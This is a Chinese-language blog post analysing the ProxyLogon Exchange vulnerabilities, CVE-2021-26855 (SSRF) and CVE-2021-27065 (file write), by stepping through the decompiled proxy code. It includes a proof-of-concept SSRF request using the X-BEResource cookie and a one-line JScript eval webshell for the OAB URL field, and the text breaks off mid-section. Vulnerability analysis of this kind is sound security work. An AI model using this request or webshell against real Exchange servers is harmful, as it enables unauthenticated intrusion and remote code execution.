

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
  <link rel="icon" href="/img/default.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="KKfine&#39;s blog">
  <meta name="keywords" content="">
  
  <title>Windows Exchange组件漏洞分析（一）：ProxyLogon - KKfine&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/16.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Windows Exchange组件漏洞分析（一）：ProxyLogon">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-11-01 12:46" pubdate>
        2022年11月1日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      92
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Windows Exchange组件漏洞分析（一）：ProxyLogon</h1>
            
            <div class="markdown-body">
              <h1 id="Windows-Exchange组件漏洞分析（一）：ProxyLogon"><a href="#Windows-Exchange组件漏洞分析（一）：ProxyLogon" class="headerlink" title="Windows Exchange组件漏洞分析（一）：ProxyLogon"></a>Windows Exchange组件漏洞分析（一）：ProxyLogon</h1><p>@[toc]<br><img src="https://img-blog.csdnimg.cn/img_convert/1572a4b5bf93b82ff7428755b78f6c9e.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259902#h2-7">参考文章</a></p>
<p>漏洞组成：SSRF+RCE（CVE-2021-26855、CVE-2021-27065）</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>windows server 2016</code> <a target="_blank" rel="noopener" href="https://blog.futrime.com/zh-cn/p/windows-server-iso%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80/">下载地址</a></p>
<p><code>windows server 2016</code><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv18446895?from=search">虚拟机安装</a></p>
<p><code>exchange 15.1.2106.2</code> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/366536079">漏洞环境搭建</a></p>
<p>其中CVE-2021–26855是一个SSRF，攻击者可以不经过任何类型的身份验证来利用此漏洞，只需要能够访问Exchange服务器即可；与此同时，CVE-2021–27065是一个任意文件写入漏洞，它需要登陆的管理员账号权限才能触发。因此，两者的结合可以造成未授权的webshell写入，属于非常高危的安全漏洞。</p>
<h2 id="组件架构"><a href="#组件架构" class="headerlink" title="组件架构"></a>组件架构</h2><p>Exchange不同版本的组件架构并不相同，但总体上可以将其分为核心的邮箱服务器角色（Mailbox Role）和可选的边缘传输角色（Edge Transport Role）。</p>
<ul>
<li>Exchange作为边缘传输角色时部署在内外网交界处，充当邮件安全网关</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://hosch3n.github.io/img/proxylogon_a.png"><img src="https://img-blog.csdnimg.cn/img_convert/2d254170e319aeb903b59319e958964d.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
<p>Exchange作为邮箱服务器角色时分为客户端访问服务（Client Access Services）和后端服务（Backend Services）部分，CAS负责校验用户身份并将请求反代至具体的后端服务。</p>
<p><a target="_blank" rel="noopener" href="https://hosch3n.github.io/img/proxylogon_b.png"><img src="https://img-blog.csdnimg.cn/img_convert/e31e662a1b365287f3c2a6b08fb76806.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
<p>CAS对应IIS中的<code>Default Web Site</code>监听在80和443端口，BS对应IIS中的<code>Exchange Back End</code>监听在81和444端口。</p>
<p><a target="_blank" rel="noopener" href="https://hosch3n.github.io/img/proxylogon_c.png"><img src="https://img-blog.csdnimg.cn/img_convert/9fa5721e29d676a6330e69641fc8b8ed.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
<p>出于解耦和兼容考虑，各个功能被封装为多个模块，有如下常用功能（缩写名对应URL访问路径）：</p>
<ul>
<li>OWA（Outlook Web App）</li>
<li>ECP（Exchange Control Panel）</li>
<li>EWS（Exchange Web Service）</li>
<li>Autodiscover</li>
<li>MAPI（Messaging Application Programming Interface）</li>
<li>EAS（Exchange ActiveSync）</li>
<li>OAB（Offline Address Books）</li>
<li>PowerShell</li>
</ul>
<h2 id="CVE-2021-26855漏洞分析"><a href="#CVE-2021-26855漏洞分析" class="headerlink" title="CVE-2021-26855漏洞分析"></a>CVE-2021-26855漏洞分析</h2><p>漏洞poc</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/target.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>337<br><br>&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;<br>    &lt;Request&gt;<br>	&lt;EMailAddress&gt;Administrator@test.com&lt;/EMailAddress&gt;<br>	&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;<br>    &lt;/Request&gt;<br>&lt;/Autodiscover&gt;<br></code></pre></div></td></tr></table></figure>


<p>正常的通过autodiscover读取配置信息的请求包。</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/autodiscover/autodiscover.xml</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>351<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>NTLM TlRMTVNTUAADAAAAGAAYAHYAAACuAK4AjgAAABYAFgBAAAAACgAKAFYAAAAWABYAYAAAAAAAAAA8AQAABQKIoDEAOQAyAC4AMQA4ADgALgAxAC4AMQB0AGUAcwB0ADEAMQA5ADIALgAxADYAOAAuADEALgAxABlZOdtFpFcfJQY7ysotO0RJVlczdGVrae1Bq6PIhSQWZ5F4VJTTyL8BAQAAAAAAAOiYz4Q0XtYBSVZXM3Rla2kAAAAAAgAIAFQARQBTAFQAAQAGAEQAQwAxAAQAEABAAGUAcwB0AC5AYwBvAG0AAwAYAGQAYwAxAC5AdABlAHMAdAAuAGMAbwBtAAUAEAB0AGUAcwB0AC4AYwBvAG0ABwAIAOiYz3Q0XtYBCQAQAGMAaQBmAHMALwBEAEMAMQAAAAAAAAAAAA==<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">X-Anchormailbox</span><span class="hljs-punctuation">: </span>test1@test.com<br><span class="hljs-attribute">X-Mapihttpcapability</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><br>&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;<br>    &lt;Request&gt;<br>	&lt;EMailAddress&gt;Administrator@test.com&lt;/EMailAddress&gt;<br>	&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;<br>    &lt;/Request&gt;<br>&lt;/Autodiscover&gt;<br></code></pre></div></td></tr></table></figure>

<p>poc中的几个问题</p>
<ul>
<li><p>关于<code>/ecp/target.js</code>路由的问题，<code>target.js</code>是否是必须的。</p>
</li>
<li><p>cookie中的<code>X-BEResource</code>字段是干什么用的，</p>
</li>
<li><p><code>X-BEResource</code>字段的值为何构造成了<code>[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753</code>这种形式。</p>
</li>
</ul>
<p>漏洞存在于Microsoft.Exchange.FrontEndHttpProxy.dll中：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fc6e3ded94a1e1af72c2ab8e8fbe2e61.png" srcset="/img/loading.gif" lazyload></p>
<p>applicationPool.MSExchangeECPAppPool是本次漏洞的相关进程.于是可以在dnspy中,点击调试-&gt;附加到进程-&gt;选中进程-&gt;附加。之后就可以下断点进行调试了。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>Microsoft.Exchange.FrontEndHttpProxy</code>调试入口为 <code>Microsoft.Exchange.HttpProxy.ProxyModule</code>的<code>SelectHandlerForAuthenticatedRequest</code>方法</p>
<p><code>BEResourceRequestHandler</code>是一个用于处理向后端进行资源型请求的类，如请求js，png，css文件等。它在函数<code>SelectHandlerForUnauthenticatedRequest</code>中被引用。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/808d1d1c2298bc4203c27b39c92a5c94.png" srcset="/img/loading.gif" lazyload></p>
<p>然后可看到有三个if语句对不同的条件进行处理。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3b4fbdad256adc05b7db4c9b91ad483e.png" srcset="/img/loading.gif" lazyload></p>
<p>在<code>IsEDiscoveryExportToolRequest</code>做了如下操作。判断<code>exporttool</code>是否会出现在url的绝对路径中，而我们请求路径中不能包含<code>exporttool</code>，然后返回false。</p>
<figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">// Token: 0x0600157C RID: 5500 RVA: 0x0003C668 File Offset: 0x0003A868</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsEDiscoveryExportToolRequest</span>(<span class="hljs-params">HttpRequestBase request</span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">string</span> absolutePath = request.Url.AbsolutePath;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(absolutePath))<br>	&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (absolutePath.IndexOf(<span class="hljs-string">&quot;/exporttool/&quot;</span>, StringComparison.OrdinalIgnoreCase) &lt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>	&#125;<br>	EDiscoveryExportToolRequestPathHandler.EnsureRegexInit();<br>	<span class="hljs-keyword">return</span> EDiscoveryExportToolRequestPathHandler.applicationPathRegex.IsMatch(absolutePath) || EDiscoveryExportToolRequestPathHandler.applicationCurrentPathRegex.IsMatch(absolutePath);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>最后一个if是判断<code>BEResourceRequestHandler.CanHandle(httpContext.Request)</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bd3d274186cec333735449d9f4898fca.png" srcset="/img/loading.gif" lazyload></p>
<p>在<code>CanHandle</code> 中可以发现需要满足两个条件</p>
<ul>
<li>HTTP请求的Cookie中含有X-BEResource键；</li>
<li>请求应是资源型请求，即请求的文件后缀应为规定的文件类型。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/71944a866b295248d7d38d8eb176b0a8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8482523334fa593a7a8a348c6015d2fe.png" srcset="/img/loading.gif" lazyload></p>
<p>然后<code>httpHandler</code>会被设置为<code>BEResourceRequestHandler</code>的一个实例，由于<code>BEResourceRequestHandler</code>继承于<code>ProxyRequstHandler</code>，因此会进入<code>((ProxyRequestHandler)httpHandler).Run(context)</code>，并最终在<code>HttpContext.RemapHandler</code>中把该httpHandler设置给this._remapHandler，即是context.Handler。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5468d39a7564f8078bbea4234cb96278.png" srcset="/img/loading.gif" lazyload></p>
<p>然后会进行一些列函数调用</p>
<figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">Microsoft.Exchange.HttpProxy.ProxyRequestHandler <br><span class="hljs-comment">--&gt;BeginCalculateTargetBackEnd </span><br><span class="hljs-comment">--&gt;InternalBeginCalculateTargetBackEnd</span><br><span class="hljs-comment">--&gt;BEResourceRequestHandler.ResolveAnchorMailbox</span><br></code></pre></div></td></tr></table></figure>

<p>最终进入到漏洞函数<code>ResolveAnchorMailbox</code>。可以看到首先调用<code>GetBEResourceCookie</code>获取到Cookie中含有<code>X-BEResource</code>键的值<br><img src="https://img-blog.csdnimg.cn/img_convert/4bd71ee2e6b152f8af62ce000c0cae1e.png" srcset="/img/loading.gif" lazyload></p>
<p>在判断 cookie中含有X-BEResource键的值不为空后，调用<code>FromString</code>处理。可以看到利用<code>~</code>来分割值，然后要求分割后的数组长度为2，也就是我们的cookie值中只含有一个<code>~</code>字符，并且<code>~</code>后面即为verison版本号，否则会报错。最后返回一个<code>BackEndServer</code>实例对象。</p>
<p>例如<code>X-BEResource=[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753</code></p>
<p>经过处理后就为</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">-<span class="hljs-keyword">array</span>[<span class="hljs-number">0</span>] = [<span class="hljs-type">name</span>]@win-v2jneuvoljv.test.com:<span class="hljs-number">443</span>/autodiscover/autodiscover.xml?#<br>version = <span class="hljs-keyword">array</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1941962753</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/9f0dc6eae7f184160e04f55afbec9257.png" srcset="/img/loading.gif" lazyload></p>
<p>分割后的结果是这样的。<br><img src="https://img-blog.csdnimg.cn/img_convert/0754dcebd730572eb547f6b7ba3f3a1d.png" srcset="/img/loading.gif" lazyload></p>
<p>函数继续执行，下面经过一系列函数调用：后端服务器的目标FQDN()计算完后调用<code>OnCalculateTargetBackEndCompleted</code>函数。这里的fqdn就是<code>win-v2jneuvoljv.test.com</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）<br>例如：主机名是bigserver,域名是mycompany<span class="hljs-selector-class">.com</span>,那么FQDN就是bigserver<span class="hljs-selector-class">.mycompany</span>.com。 <span class="hljs-selector-attr">[1]</span> <br></code></pre></div></td></tr></table></figure>

<p><code>OnCalculateTargetBackEndCompleted</code>函数，该函数又调用<code>InternalOnCalculateTargetBackEndCompleted</code>函数<br><img src="https://img-blog.csdnimg.cn/img_convert/779614182c93b8f6bbd88678c9db2102.png" srcset="/img/loading.gif" lazyload></p>
<p>紧接着调用<code>BeginValidateBackendServerCacheOrProxyOrRecalculate</code>函数，<br><img src="https://img-blog.csdnimg.cn/img_convert/ef72f5b2bce994be4a02e87fffeb2308.png" srcset="/img/loading.gif" lazyload></p>
<p>然后调用<code>BeginProxyRequestOrRecalculate</code>函数，<br><img src="https://img-blog.csdnimg.cn/img_convert/ac6a7560536b178223d039d321e8e604.png" srcset="/img/loading.gif" lazyload></p>
<p>最终进入到<code>BeginProxyRequest</code>函数中调用<code>GetTargetBackendServerUrl</code><br><img src="https://img-blog.csdnimg.cn/img_convert/b0d4c6a6accd8249997c82eae984c66e.png" srcset="/img/loading.gif" lazyload></p>
<p><code>GetTargetBackendServerUrl</code>中将调用<code>GetClientUrlForProxy</code>函数构造发起请求的URL。这里有个关键点，如果版本大于<code>Server.E15MinVersion</code>，<code>ProxyToDownLevel</code>则为false，这个是一个重点之一，因为后续会判断<code>ProxyToDownLevel</code>是否为true，true的话就无法绕过身份验证。</p>
<p>第二个关键点就是<code>this.AnchoredRoutingTarget.BackEndServer.Fqdn;</code>该位置的值可控，那么result的值也可控。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7c28abb0d6765d27ccffcf123cf10db1.png" srcset="/img/loading.gif" lazyload></p>
<p>Server.E15MinVersion值</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cb28504428ace8034c0f85fa1415651c.png" srcset="/img/loading.gif" lazyload></p>
<p>然后这段代码实例化了一个 UrlBuilder类，涉及三个关键属性，Scheme、Host 和 Port。Schema 被设置为https；Host 取自于 BackEndServer.Fqdn，看一下 Host.Set() :</p>
<p>可以看到在这个函数里面判断host第一个字符是否为<code>[</code>并且其中是否含有<code>:</code>，如果都满足就将其用<code>[]</code>包裹起来。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8ca184f279e60f2a87378d1242d2e2d5.png" srcset="/img/loading.gif" lazyload></p>
<p>所以举个例子，如果我们设置为这样</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-BEResource=@WIN-PDEITI<span class="hljs-number">81</span>MJNQ.server.cd:<span class="hljs-number">443</span>/autodiscover/autodiscover.xml?#~<span class="hljs-number">1941962753</span><br></code></pre></div></td></tr></table></figure>

<p>最后赋值完的结果是这样的。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cda0a64d680d0a465197b32439961270.png" srcset="/img/loading.gif" lazyload></p>
<p>但在给Post字段赋值完后会自动进行重新解析，变成下面这样：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/37cd372c2efc7908a9610ed7bcc5ee57.png" srcset="/img/loading.gif" lazyload></p>
<p>在将上面三个属性赋值后，该函数就返回了 clientUrlForProxy.Uri，查看Uri 的get方法:</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d4f2be68c6fb45904425d5cd4065f06b.png" srcset="/img/loading.gif" lazyload></p>
<p>调用了 UriBuilder.ToString() 方法来取得最终的 指向BackEnd 的目标url。在 ToString() 中对各个参数进行拼接，形成url。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/93b309f1c293889f5154019fae7770b1.png" srcset="/img/loading.gif" lazyload></p>
<p>拼接完就是这样的</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bfd04e97de3eec46d1d43122341bf367.png" srcset="/img/loading.gif" lazyload></p>
<p>最终在调用this.CreateServerRequest将uri发送给后端服务器</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7c2c5861347eca9d1e21759cfa95699e.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f92b20e3746cccf708b614eebd6af349.png" srcset="/img/loading.gif" lazyload></p>
<p>调用<code>this.PrepareServerRequest(httpWebRequest);</code></p>
<p>进行身份认证。可以看到这里就判断了<code>ProxyToDownLevel</code>是否为true，为false会直接报错。<br><img src="https://img-blog.csdnimg.cn/img_convert/65dbb263047872a80576b7a094a66ad2.png" srcset="/img/loading.gif" lazyload></p>
<p>调用 <code>GenerateKerberosAuthHeader() </code>函数来 创建Kerberos 认证头部。这也是中间代理能够访问BackEnd Server的原因 。<br><img src="https://img-blog.csdnimg.cn/img_convert/da3983a992e4113b0cb3c66482ecb294.png" srcset="/img/loading.gif" lazyload></p>
<p>ShouldBlockCurrentOAuthRequest函数里的ProxyToDownLevel是用来检查用户是否已通过身份验证；而当有请求调用BEResourceRequestHandler时，ShouldBackendRequestBeAnonymous()就会被调用。绕过认证，然后把数据包组成后发送给后端。后端响应请求，把数据返回给客户端。最后达到一个SSRF漏洞攻击的过程。</p>
<p>经过上面的分析，我们回答了一开始的问题:</p>
<p>/ecp/target.js 不是必须的，它可以是其他的路径 /ecp/xxxxxxxx.png</p>
<p>X-BEResource 用于代理请求，其原本格式应该是 [fqdn]~BackEndServerVersion</p>
<p>BackEndServerVersion 应该大于1941962752，‘#’ 用于在有url请求参数时分隔参数。</p>
<p>而且我们知道了X-BEResource 实际上完全不需要 <code>]</code> 去闭合中括号，我们完全可以直接用<code>[]</code>来将name 括起来，比如下面这样：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-string">[name]</span>@win-v2jneuvoljv.test.com:<span class="hljs-number">443</span>/<span class="hljs-built_in">auto</span>discover/<span class="hljs-built_in">auto</span>discover.xml?#~<span class="hljs-number">1941962753</span><br></code></pre></div></td></tr></table></figure>

<h2 id="CVE-2021–27065"><a href="#CVE-2021–27065" class="headerlink" title="CVE-2021–27065"></a>CVE-2021–27065</h2><p>漏洞成因</p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">Microsoft<span class="hljs-selector-class">.Exchange</span><span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.DDIService</span>.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell。<br></code></pre></div></td></tr></table></figure>

<p><code>Microsoft.Exchange.Management.DDIService.WriteFileActivity</code>中有一处明显的补丁变动，使得文件后缀名只能为txt。<br><img src="https://img-blog.csdnimg.cn/img_convert/4dd95edc875a8853a0ed0358bad8acbe.png" srcset="/img/loading.gif" lazyload></p>
<p>在Exchange服务器上依次打开[管理中心] -&gt; [服务器] -&gt;  [虚拟目录] -&gt;  [OAB虚拟目录]。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/63eccf8cf2d469f8897cf9f1fddb32ad.png" srcset="/img/loading.gif" lazyload></p>
<p>在url中填入一句话木马。</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">http://ffff/#<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span>&gt;</span><span class="javascript"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Page_Load</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">/**/</span><span class="hljs-built_in">eval</span>(Request[<span class="hljs-string">&quot;code&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/8812b83201806cf89941b5941fdce2a0.png" srcset="/img/loading.gif" lazyload></p>
<p>查看请求包，使用的是<code>/ecp/DDI/DDIService.svc/SetObject</code>接口</p>
